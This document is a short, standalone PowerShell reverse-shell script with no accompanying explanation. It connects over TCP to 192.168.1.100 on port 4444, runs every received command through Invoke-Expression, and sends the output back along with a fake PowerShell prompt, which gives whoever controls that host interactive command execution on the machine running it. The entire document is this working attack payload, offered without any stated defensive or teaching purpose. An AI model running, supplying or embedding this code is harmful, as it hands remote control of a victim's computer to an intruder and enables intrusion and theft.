$client = New-Object System.Net.Sockets.TCPClient("192.168.1.100", 4444);
$stream = $client.GetStream();
$writer = New-Object System.IO.StreamWriter($stream);
$buffer = New-Object byte[] 1024;
while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2  = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}
$client.Close();
